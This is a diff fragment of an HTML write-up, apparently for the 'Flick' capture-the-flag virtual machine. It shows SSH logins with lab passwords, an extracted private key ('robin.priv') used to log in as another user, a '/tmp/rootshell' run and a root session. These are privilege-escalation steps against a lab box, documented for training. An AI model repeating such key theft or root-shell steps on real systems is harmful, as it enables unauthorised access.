+root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#114;&#x6f;&#98;&#105;&#110;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#48;&#x2e;&#49;&#x30;&#x36;">&#x72;&#x6f;&#98;&#x69;&#x6e;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#x30;&#46;&#x31;&#48;&#54;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -2636,10 +2609,10 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#114;&#111;&#x62;&#105;&#x6e;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x30;&#46;&#49;&#x30;&#54;">&#x72;&#x6f;&#x62;&#x69;&#110;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x30;&#46;&#49;&#x30;&#x36;</a>&rsquo;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
+<p><a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#x72;&#111;&#98;&#105;&#x6e;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#48;&#x2e;&#x31;&#48;&#54;">&#x72;&#111;&#98;&#x69;&#110;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#48;&#x2e;&#x31;&#x30;&#x36;</a>&rsquo;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
 Permission denied, please try again.
-<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x72;&#111;&#x62;&#105;&#110;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#48;&#x2e;&#x31;&#48;&#x36;">&#114;&#111;&#x62;&#x69;&#110;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x30;&#x2e;&#x31;&#x30;&#x36;</a>&rsquo;s password: ^C
-root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#100;&#x65;&#x61;&#110;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#x2e;&#x31;&#x30;&#54;">&#x64;&#101;&#x61;&#110;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x30;&#46;&#x31;&#x30;&#x36;</a></p>
+<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x72;&#111;&#x62;&#x69;&#x6e;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x30;&#46;&#x31;&#48;&#54;">&#x72;&#x6f;&#98;&#x69;&#x6e;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#49;&#x30;&#x36;</a>&rsquo;s password: ^C
+root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#100;&#x65;&#x61;&#110;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#48;&#46;&#x31;&#x30;&#x36;">&#x64;&#x65;&#97;&#x6e;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x30;&#46;&#x31;&#x30;&#54;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -2649,7 +2622,7 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#100;&#x65;&#97;&#x6e;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#48;&#x2e;&#x31;&#x30;&#54;">&#100;&#101;&#x61;&#x6e;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x30;&#x2e;&#x31;&#48;&#x36;</a>&rsquo;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
+<p><a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x64;&#x65;&#x61;&#110;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x30;&#46;&#x31;&#48;&#x36;">&#x64;&#x65;&#97;&#110;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x30;&#46;&#x31;&#48;&#54;</a>&rsquo;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
 Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>
 
 <ul>
@@ -2792,7 +2765,7 @@ dean@flick:~$ [/plain]</p>
 <p>[plain gutter=&ldquo;false&rdquo;]
 dean@flick:~$ ./read_docker ./ > robin.priv
 dean@flick:~$ chmod 600 ./robin.priv
-dean@flick:~$ ssh -i robin.priv <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#114;&#111;&#x62;&#105;&#x6e;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;">&#114;&#x6f;&#x62;&#105;&#110;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#x31;</a></p>
+dean@flick:~$ ssh -i robin.priv <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#114;&#111;&#98;&#105;&#110;&#x40;&#x31;&#x32;&#x37;&#x2e;&#48;&#46;&#x30;&#46;&#x31;">&#x72;&#111;&#x62;&#105;&#110;&#x40;&#x31;&#50;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -3557,7 +3530,7 @@ robin@flick:~$ /tmp/rootshell</p>
 <p>And for completeness, an SSH session as root.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#114;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#48;&#x2e;&#49;&#x30;&#x36;">&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x30;&#x2e;&#x31;&#x30;&#x36;</a></p>
+root@pwk:~# ssh <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#48;&#x2e;&#49;&#48;&#x36;">&#114;&#111;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#48;&#x2e;&#x31;&#x30;&#x36;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
